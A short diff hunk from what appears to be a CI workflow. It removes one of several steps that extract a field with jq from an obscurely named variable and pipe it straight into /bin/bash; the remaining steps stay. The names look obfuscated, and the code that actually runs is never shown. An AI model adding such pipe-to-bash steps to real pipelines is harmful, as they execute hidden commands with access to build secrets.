@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
           echo $dzqav05281 | jq -r .snbs519 | /bin/bash
           echo $jknlc9 | jq -r .nnh1065 | /bin/bash
-          echo $nmpi5332 | jq -r .l82 | /bin/bash
           echo $xb73832 | jq -r .gp2300 | /bin/bash
           echo $l674 | jq -r .oi7694 | /bin/bash
 
